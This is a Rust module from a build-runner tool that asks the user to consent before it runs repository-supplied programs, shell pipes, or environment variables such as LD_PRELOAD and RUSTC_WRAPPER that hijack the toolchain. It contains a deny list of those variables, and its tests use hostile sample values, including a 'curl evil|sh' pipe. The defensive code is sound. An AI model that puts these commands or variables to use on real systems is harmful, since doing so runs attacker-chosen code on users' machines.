//! Consent gate for repository-supplied commands.
//!
//! `.cargo-runner.json` lives in the repository, so it is attacker-controlled
//! whenever a user opens a project they did not write. Two of its fields lead
//! straight to code execution:
//!
//! * `command` — a value other than `cargo` becomes the executed program.
//! * `extra_env` — keys such as `RUSTC_WRAPPER` or `LD_PRELOAD` make an
//!   otherwise ordinary `cargo build` run an attacker-chosen binary.
//!
//! Running `cargo`, `rustc` or `bazel` is what the user asked for. Running
//! something else, or running it with an environment that hijacks the
//! toolchain, is a different thing and needs to be agreed to once.
//!
//! The policy is deliberately small: recognise the tools cargo-runner itself
//! knows how to drive, and ask about anything else. Approvals are stored per
//! project root so a decision does not leak between checkouts.

use serde::{Deserialize, Serialize};
use std::{
    collections::{BTreeMap, HashMap},
    path::{Path, PathBuf},
    sync::{Mutex, OnceLock},
};

/// Programs cargo-runner's own builders and built-in plugins can emit.
///
/// Keep this in sync with `plugins::registry::PluginRegistry::with_defaults`
/// and the overlays in `plugins::builtins`. Membership here means "the user
/// asked for a Rust build/test/run", not "this binary is safe in general".
pub const KNOWN_PROGRAMS: &[&str] = &[
    // Primary build systems
    "cargo",
    "rustc",
    "bazel",
    "bazelisk",
    // Built-in framework overlays
    "dx",      // Dioxus
    "trunk",   // Trunk / WASM
    "leptos",  // cargo-leptos
    "tauri",   // Tauri
    "wasm-pack",
    // Common cargo subcommand shims resolved as their own binary
    "cargo-nextest",
    "cross",
];

/// Environment variables that turn a benign build command into code execution.
///
/// These are checked regardless of which program runs, because setting any of
/// them makes even `cargo build` execute something the repository chose.
pub const DANGEROUS_ENV: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "RUSTC",
    "RUSTC_WRAPPER",
    "RUSTC_WORKSPACE_WRAPPER",
    "CARGO",
    "CARGO_BUILD_RUSTC",
    "CARGO_BUILD_RUSTC_WRAPPER",
    "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER",
    "RUSTFLAGS",
    "CARGO_BUILD_RUSTFLAGS",
    "PATH",
];

/// Outcome of the policy check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Nothing outside the set of tools cargo-runner drives by design.
    Allowed,
    /// Needs a human decision. Each string is a user-facing reason.
    NeedsConsent(Vec<String>),
}

/// Strip directory and a Windows `.exe` suffix so `/usr/bin/cargo` and
/// `cargo.exe` both compare as `cargo`.
fn program_key(program: &str) -> String {
    let base = Path::new(program)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(program);
    base.strip_suffix(".exe").unwrap_or(base).to_ascii_lowercase()
}

/// Dangerous environment entries present in `env`, sorted for stable output.
pub fn flagged_env(env: &HashMap<String, String>) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    for key in DANGEROUS_ENV {
        if let Some(value) = env.get(*key) {
            out.insert((*key).to_string(), value.clone());
        }
    }
    out
}

/// Decide whether a resolved command can run without asking.
///
/// A program given as an absolute or relative *path* is never auto-allowed
/// even if its file name matches a known tool: `./cargo` in the repository is
/// not the `cargo` on PATH.
///
/// `pipe` is the command's `pipe_command`, and its presence alone requires
/// consent no matter how ordinary the program looks. When a pipe is set, the
/// rustc path stops using argv and builds a `sh -c` string instead, splicing in
/// the executable path, exec args, the test filter and test-binary args
/// **unquoted** alongside the pipe itself. So the pipe does not merely add one
/// shell command — it turns the whole invocation into shell source, and the
/// test filter is derived from names in the repository's own code. Without a
/// pipe that same path passes every value through `.arg()` and is safe.
pub fn evaluate(program: &str, env: &HashMap<String, String>, pipe: Option<&str>) -> Verdict {
    let mut reasons = Vec::new();

    let looks_like_path = program.contains('/') || program.contains('\\');
    let known = KNOWN_PROGRAMS.contains(&program_key(program).as_str());

    if looks_like_path {
        reasons.push(format!(
            "runs `{program}` by path, not a tool resolved from PATH"
        ));
    } else if !known {
        reasons.push(format!(
            "runs `{program}`, which is not one of the build tools cargo-runner knows"
        ));
    }

    if let Some(pipe) = pipe.map(str::trim).filter(|p| !p.is_empty()) {
        reasons.push(format!(
            "pipes output through `{pipe}`, which runs as a shell command"
        ));
    }

    for (key, value) in flagged_env(env) {
        reasons.push(format!(
            "sets {key}={value}, which changes what the build executes"
        ));
    }

    if reasons.is_empty() {
        Verdict::Allowed
    } else {
        Verdict::NeedsConsent(reasons)
    }
}

/// A recorded decision.
///
/// The full tuple is stored rather than a digest so the file stays readable
/// and a user can audit or hand-edit what they approved. `args` are
/// intentionally excluded: they vary per runnable (test names, targets) while
/// the program and environment are what determine *what code runs*.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Approval {
    /// Canonical project root the approval applies to.
    pub root: String,
    pub program: String,
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    /// Recorded so approving one pipe does not bless a different one.
    /// `default` keeps stores written before this field parseable.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pipe: Option<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct TrustStore {
    #[serde(default = "default_version")]
    pub version: u32,
    #[serde(default)]
    pub approvals: Vec<Approval>,
}

fn default_version() -> u32 {
    1
}

/// `$XDG_CONFIG_HOME/cargo-runner/trust.json`, else `~/.config/…`.
pub fn store_path() -> Option<PathBuf> {
    let base = std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|p| !p.as_os_str().is_empty())
        .or_else(|| {
            std::env::var_os("HOME")
                .map(PathBuf::from)
                .filter(|p| !p.as_os_str().is_empty())
                .map(|h| h.join(".config"))
        })?;
    Some(base.join("cargo-runner").join("trust.json"))
}

impl TrustStore {
    /// Load the store, treating any read/parse failure as "nothing approved".
    ///
    /// Failing open on a corrupt file would silently disable the gate, so a
    /// broken store simply means every decision is asked again.
    pub fn load() -> Self {
        let Some(path) = store_path() else {
            return Self::default();
        };
        let Ok(text) = std::fs::read_to_string(&path) else {
            return Self::default();
        };
        match serde_json::from_str(&text) {
            Ok(store) => store,
            Err(e) => {
                // Failing closed is right — every decision gets asked again —
                // but a corrupt store should not be silently indistinguishable
                // from an empty one.
                tracing::warn!(
                    "ignoring unreadable trust store {}: {e}; approvals will be requested again",
                    path.display()
                );
                Self::default()
            }
        }
    }

    pub fn contains(&self, approval: &Approval) -> bool {
        self.approvals.iter().any(|a| a == approval)
    }

    pub fn insert(&mut self, approval: Approval) {
        if !self.contains(&approval) {
            self.approvals.push(approval);
        }
    }

    pub fn save(&self) -> std::io::Result<()> {
        let Some(path) = store_path() else {
            return Err(std::io::Error::other(
                "cannot determine a config directory for the trust store",
            ));
        };
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let text = serde_json::to_string_pretty(self)
            .map_err(|e| std::io::Error::other(e.to_string()))?;
        std::fs::write(&path, text)
    }
}

/// Build the approval record for a resolved command.
pub fn approval_for(
    working_dir: Option<&Path>,
    program: &str,
    env: &HashMap<String, String>,
    pipe: Option<&str>,
) -> Approval {
    // Fall back to the current directory rather than a sentinel: commands built
    // by the rustc path carry no working_dir, and a shared placeholder would
    // make one approval apply in every project instead of just this one.
    let root = working_dir
        .map(Path::to_path_buf)
        .or_else(|| std::env::current_dir().ok())
        .map(|d| {
            std::fs::canonicalize(&d)
                .unwrap_or(d)
                .to_string_lossy()
                .into_owned()
        })
        .unwrap_or_else(|| "<unknown-project>".to_string());
    Approval {
        root,
        program: program.to_string(),
        env: flagged_env(env),
        pipe: pipe
            .map(str::trim)
            .filter(|p| !p.is_empty())
            .map(str::to_string),
    }
}

/// Approvals granted for this process only, never written to disk.
///
/// Backs the "allow once" answer. Keeping it here rather than having the CLI
/// set an environment variable means a single yes stays scoped to the exact
/// command it was given for, instead of becoming a blanket bypass for every
/// later command in the process.
static SESSION_APPROVALS: OnceLock<Mutex<Vec<Approval>>> = OnceLock::new();

fn session_approvals() -> &'static Mutex<Vec<Approval>> {
    SESSION_APPROVALS.get_or_init(|| Mutex::new(Vec::new()))
}

/// Allow `approval` for the remainder of this process without persisting it.
pub fn allow_for_process(approval: Approval) {
    // A poisoned lock would mean another thread panicked mid-update; recover
    // the guard rather than propagate, since failing here would deny a command
    // the user already approved.
    let mut guard = session_approvals()
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    if !guard.contains(&approval) {
        guard.push(approval);
    }
}

/// True when `approval` was granted earlier in this process.
pub fn approved_in_process(approval: &Approval) -> bool {
    session_approvals()
        .lock()
        .map(|g| g.contains(approval))
        .unwrap_or(false)
}

/// True when the process was told to skip the prompt for this run.
///
/// Set by CI and by `--trust-config`. Deliberately explicit: the gate should
/// never be bypassed just because no terminal is attached.
pub fn bypass_requested() -> bool {
    matches!(
        std::env::var("CARGO_RUNNER_TRUST").as_deref(),
        Ok("1") | Ok("true") | Ok("yes")
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env_of(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn known_tools_run_without_consent() {
        for program in ["cargo", "rustc", "bazel", "dx", "cargo.exe", "trunk"] {
            assert_eq!(
                evaluate(program, &HashMap::new(), None),
                Verdict::Allowed,
                "{program} should be allowed"
            );
        }
    }

    #[test]
    fn a_pipe_needs_consent_even_for_an_allowlisted_program() {
        // The rustc path switches to `sh -c` when a pipe is set, so "rustc"
        // being allowlisted is not enough on its own.
        let Verdict::NeedsConsent(reasons) =
            evaluate("rustc", &HashMap::new(), Some("sh -c 'id'"))
        else {
            panic!("a pipe must require consent");
        };
        assert!(
            reasons.iter().any(|r| r.contains("sh -c 'id'")),
            "reason should name the pipe: {reasons:?}"
        );
    }

    #[test]
    fn an_empty_pipe_is_not_a_pipe() {
        assert_eq!(evaluate("rustc", &HashMap::new(), Some("")), Verdict::Allowed);
        assert_eq!(
            evaluate("rustc", &HashMap::new(), Some("   ")),
            Verdict::Allowed
        );
    }

    #[test]
    fn approving_one_pipe_does_not_bless_another() {
        let mut store = TrustStore::default();
        let approved = approval_for(Some(Path::new("/tmp")), "rustc", &HashMap::new(), Some("less"));
        store.insert(approved.clone());

        assert!(store.contains(&approved));
        let swapped = approval_for(
            Some(Path::new("/tmp")),
            "rustc",
            &HashMap::new(),
            Some("sh -c 'curl evil|sh'"),
        );
        assert!(
            !store.contains(&swapped),
            "a different pipe must not reuse the approval"
        );
    }

    #[test]
    fn process_approvals_satisfy_the_gate_without_touching_disk() {
        let approval = approval_for(
            Some(Path::new("/tmp/process-scope")),
            "some-tool",
            &HashMap::new(),
            None,
        );
        assert!(!approved_in_process(&approval));
        allow_for_process(approval.clone());
        assert!(approved_in_process(&approval));

        // Scoped to that exact command — a different one is still unapproved.
        let other = approval_for(
            Some(Path::new("/tmp/process-scope")),
            "another-tool",
            &HashMap::new(),
            None,
        );
        assert!(!approved_in_process(&other));
    }

    #[test]
    fn stores_written_before_the_pipe_field_still_parse() {
        let legacy = r#"{"version":1,"approvals":[{"root":"/tmp","program":"dx","env":{}}]}"#;
        let store: TrustStore = serde_json::from_str(legacy).unwrap();
        assert_eq!(store.approvals.len(), 1);
        assert_eq!(store.approvals[0].pipe, None);
    }

    #[test]
    fn unknown_program_needs_consent() {
        let Verdict::NeedsConsent(reasons) = evaluate("evil-tool", &HashMap::new(), None) else {
            panic!("expected consent to be required");
        };
        assert!(reasons[0].contains("evil-tool"));
    }

    #[test]
    fn path_shaped_program_is_never_auto_allowed() {
        // A repo-local `./cargo` is not the cargo on PATH.
        for program in ["./cargo", "/bin/sh", "../evil", "sub/dir/cargo"] {
            assert!(
                matches!(evaluate(program, &HashMap::new(), None), Verdict::NeedsConsent(_)),
                "{program} should require consent"
            );
        }
    }

    #[test]
    fn dangerous_env_needs_consent_even_for_cargo() {
        let env = env_of(&[("RUSTC_WRAPPER", "./evil")]);
        let Verdict::NeedsConsent(reasons) = evaluate("cargo", &env, None) else {
            panic!("expected consent to be required");
        };
        assert!(reasons.iter().any(|r| r.contains("RUSTC_WRAPPER")));
    }

    #[test]
    fn ordinary_env_is_ignored() {
        let env = env_of(&[("RUST_LOG", "debug"), ("MY_APP_PORT", "8080")]);
        assert_eq!(evaluate("cargo", &env, None), Verdict::Allowed);
    }

    #[test]
    fn every_dangerous_key_is_detected() {
        for key in DANGEROUS_ENV {
            let env = env_of(&[(key, "x")]);
            assert!(
                matches!(evaluate("cargo", &env, None), Verdict::NeedsConsent(_)),
                "{key} should require consent"
            );
        }
    }

    #[test]
    fn store_round_trips_and_matches_exactly() {
        let mut store = TrustStore::default();
        let env = env_of(&[("RUSTC_WRAPPER", "./w")]);
        let approval = approval_for(Some(Path::new("/tmp")), "dx", &env, None);

        assert!(!store.contains(&approval));
        store.insert(approval.clone());
        assert!(store.contains(&approval));

        // A different env value is a different decision.
        let other = approval_for(Some(Path::new("/tmp")), "dx", &env_of(&[("RUSTC_WRAPPER", "./other")]), None);
        assert!(!store.contains(&other));

        // Same tuple in another project is also a separate decision.
        let elsewhere = approval_for(Some(Path::new("/")), "dx", &env, None);
        assert!(!store.contains(&elsewhere));

        let text = serde_json::to_string(&store).unwrap();
        let back: TrustStore = serde_json::from_str(&text).unwrap();
        assert!(back.contains(&approval));
    }

    #[test]
    fn inserting_twice_does_not_duplicate() {
        let mut store = TrustStore::default();
        let approval = approval_for(Some(Path::new("/tmp")), "dx", &HashMap::new(), None);
        store.insert(approval.clone());
        store.insert(approval);
        assert_eq!(store.approvals.len(), 1);
    }
}
